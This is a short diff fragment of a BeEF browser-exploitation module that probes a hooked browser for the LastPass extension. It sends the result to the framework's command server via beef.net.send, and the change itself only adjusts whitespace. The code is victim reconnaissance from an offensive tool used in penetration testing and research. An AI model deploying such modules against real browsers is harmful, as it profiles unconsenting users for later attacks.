@@ -21,9 +21,8 @@ beef.execute(function() {
 			//No forms
 			result = "The page doesn't seem to include any forms - we can't tell if LastPass is installed";
 		}
-		
+
 	}
 
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
 });
-
